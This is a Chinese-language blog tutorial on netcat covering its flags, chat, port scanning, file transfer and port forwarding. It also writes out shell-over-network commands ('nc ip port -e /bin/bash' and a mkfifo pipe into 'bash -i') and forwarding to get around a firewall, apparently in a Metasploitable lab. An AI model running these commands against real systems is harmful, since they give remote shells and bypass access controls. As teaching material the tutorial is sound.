---
title: netcat
date: 2019-01-17 15:19:13
tags:
---

netcat简称nc, 能通过tcp和udp在网络中读取数据。在两台电脑间建立连接，监听并返回两个数据流。

#### 1.常用参数：
```
	-4/6 使用IPv4/6地址
	-b 允许broadcast广播
	-c  发送CRLF（回车换行 Carriage-Return Line-Feed）当line-ending
	-d 不尝试读取stdin
	-I length 设置TCP接收的buffer的大小
	-i interval 设置发送和接收间的延迟秒数，
	-l 监听模式
	-n 直接使用ip,不通过域名服务器DNS查询域名
	-o length  设置TCP发送的buffer大小
	-P 代理名字
	-p nc使用的端口
	-v verbose更多输出信息
	-w timeout
	-u 使用UDP
	-r 随机选择端口
	-s source  设置本地主机送出数据包的IP地址
```
#### 2.使用例子
#####	1.建立连接，聊天
		nc -l port 在本地主机监听一个端口<br>
		nc ip port 在其它主机与之建立连接（默认TCP），发送消息
#####	2.端口扫描
		原理，进行tcp三次握手建立连接，如果成功则说明端口开放，容易被防火墙，IDS检测到<br>
		nc -v -n -z ip port(可以是范围)<br>
			-v进行详细输出<br>
			-n不进行域名查询<br>
			-z建立连接后关闭连接，不进行数据交换<br>
#####	3.数据传输(甚至可以传输流媒体）
		类似于聊天，只是将输入换成文件，使用重定向或者管道符<br>
		server:  nc -l port < file1.txt<br>
		clien: nc -n ip port > file2txt<br>
		file1往file2传数据<br>
#####	4.获取shell，正反向shell
		如果有-e参数，直接 nc ip port -e /bin/bash<br>
		无-e参数时:<br>
		server:<br>
		mkfifo /tmp/fifo<br>
		cat /tmp/fifo | /bin/bash -i 2>&1 | nc -l port > /tmp/fifo<br>
		client:<br>
		nc ip port<br>
		原理：<br>
		bash -i 进入交互模式<br>
		通过mkfifo 建立一个管道（命令管道）文件，将管道文件的内容通过匿名管道传给/bin/bash执行，然后再将nc监听到的输入写入fifo,形成一个循环

#####	5.端口转发
		- 背景：192.168.1.103的msfadmin用户需要访问192.168.1.102的8000端口，但是该端口被防火墙保护着，不允许外界机器访问。目前msfadmin用户只能访问192.168.1.102的9000端口。需要9000端口做转发。
		- 目标：msfadmin通过访问192.168.1.102的9000端口，达到与8000端口通话的目的。
		原理：<br>
		在102上：nc -l 8000<br>
					  cat /tmp/fifo | nc localhost 8000 | nc -l 9000 > /tmp/fifo
		在103上：<br>
				nc 192.168.1.102 9000<br>
		在102主机上，开启要转发的8000端口，然后用9000端口通过接收数据，然后连接本地8000端口，将命令管道的数据通过匿名管道传给8000端口
